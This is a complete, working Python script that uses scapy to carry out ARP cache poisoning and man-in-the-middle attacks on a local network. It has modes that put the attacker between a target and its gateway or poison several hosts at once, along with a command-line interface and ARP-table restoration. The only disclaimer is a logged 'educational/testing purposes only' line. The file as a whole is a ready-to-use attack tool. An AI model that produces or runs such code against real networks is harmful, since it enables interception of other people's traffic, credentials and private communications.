#!/usr/bin/env python3

import argparse
import sys
import time
import logging
import os
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import threading

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class ARPSpoofer:
    def __init__(self, interface=None):
        self.interface = interface or conf.iface
        self.spoofing = False
        self.original_mac_cache = {}
        
        logger.info(f"ARP Spoofer initialized on interface: {self.interface}")
    
    def get_mac(self, ip):
        if ip in self.original_mac_cache:
            return self.original_mac_cache[ip]
        
        answered, unanswered = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
            timeout=2,
            verbose=False,
            iface=self.interface
        )
        
        if answered:
            mac = answered[0][1].hwsrc
            self.original_mac_cache[ip] = mac
            return mac
        
        return None
    
    def spoof_arp(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        
        if not target_mac:
            logger.error(f"Could not find MAC for {target_ip}")
            return False
        
        packet = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        
        send(packet, verbose=False, iface=self.interface)
        return True
    
    def restore_arp(self, target_ip, source_ip):
        target_mac = self.get_mac(target_ip)
        source_mac = self.get_mac(source_ip)
        
        if not target_mac or not source_mac:
            logger.error("Could not restore ARP table")
            return False
        
        packet = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )
        
        send(packet, count=5, verbose=False, iface=self.interface)
        logger.info(f"Restored ARP table for {target_ip}")
        return True
    
    def mitm_attack(self, target_ip, gateway_ip, duration=60):
        logger.info(f"Starting MITM attack")
        logger.info(f"  Target: {target_ip}")
        logger.info(f"  Gateway: {gateway_ip}")
        logger.info(f"  Duration: {duration}s")
        
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        
        if not target_mac or not gateway_mac:
            logger.error("Failed to resolve MAC addresses")
            return
        
        logger.info(f"  Target MAC: {target_mac}")
        logger.info(f"  Gateway MAC: {gateway_mac}")
        
        self.spoofing = True
        start_time = time.time()
        
        try:
            while self.spoofing and (time.time() - start_time) < duration:
                self.spoof_arp(target_ip, gateway_ip)
                
                self.spoof_arp(gateway_ip, target_ip)
                
                time.sleep(2)
                
                if int(time.time() - start_time) % 10 == 0:
                    logger.info(f"MITM active... {int(time.time() - start_time)}s elapsed")
        
        except KeyboardInterrupt:
            logger.info("MITM interrupted by user")
        
        finally:
            self.spoofing = False
            logger.info("Restoring ARP tables...")
            self.restore_arp(target_ip, gateway_ip)
            self.restore_arp(gateway_ip, target_ip)
            logger.info("ARP tables restored")
    
    def poison_attack(self, targets, spoof_ip, duration=60):
        logger.info(f"Starting ARP poisoning attack")
        logger.info(f"  Targets: {', '.join(targets)}")
        logger.info(f"  Spoofing as: {spoof_ip}")
        logger.info(f"  Duration: {duration}s")
        
        target_macs = {}
        for target in targets:
            mac = self.get_mac(target)
            if mac:
                target_macs[target] = mac
            else:
                logger.warning(f"Could not resolve MAC for {target}")
        
        if not target_macs:
            logger.error("No valid targets found")
            return
        
        self.spoofing = True
        start_time = time.time()
        
        try:
            while self.spoofing and (time.time() - start_time) < duration:
                for target_ip in target_macs.keys():
                    self.spoof_arp(target_ip, spoof_ip)
                
                time.sleep(2)
                
                if int(time.time() - start_time) % 10 == 0:
                    logger.info(f"Poisoning active... {int(time.time() - start_time)}s elapsed")
        
        except KeyboardInterrupt:
            logger.info("Poisoning interrupted by user")
        
        finally:
            self.spoofing = False
            logger.info("Restoring ARP tables...")
            
            spoof_mac = self.get_mac(spoof_ip)
            if spoof_mac:
                for target_ip in target_macs.keys():
                    self.restore_arp(target_ip, spoof_ip)
            
            logger.info("ARP tables restored")

def main():
    parser = argparse.ArgumentParser(description='ARP Spoofing / MITM Attack Tool')
    parser.add_argument('--interface', '-i', help='Network interface')
    parser.add_argument('--mode', '-m', choices=['mitm', 'poison'], required=True,
                       help='Attack mode: mitm or poison')
    parser.add_argument('--target', '-t', required=True, help='Target IP address')
    parser.add_argument('--gateway', '-g', help='Gateway IP (required for MITM mode)')
    parser.add_argument('--spoof-ip', '-s', help='IP to spoof as (required for poison mode)')
    parser.add_argument('--duration', '-d', type=int, default=60, 
                       help='Attack duration in seconds')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        logger.error("This script requires root privileges. Please run with sudo.")
        sys.exit(1)
    
    spoofer = ARPSpoofer(interface=args.interface)
    
    logger.info("="*80)
    logger.info("ARP Spoofing Attack Tool")
    logger.info("WARNING: For educational/testing purposes only!")
    logger.info("="*80)
    
    if args.mode == 'mitm':
        if not args.gateway:
            logger.error("Gateway IP required for MITM mode")
            sys.exit(1)
        
        spoofer.mitm_attack(args.target, args.gateway, args.duration)
    
    elif args.mode == 'poison':
        if not args.spoof_ip:
            logger.error("Spoof IP required for poison mode")
            sys.exit(1)
        
        targets = args.target.split(',')
        spoofer.poison_attack(targets, args.spoof_ip, args.duration)
    
    logger.info("\n✓ Attack complete")

if __name__ == '__main__':
    main()

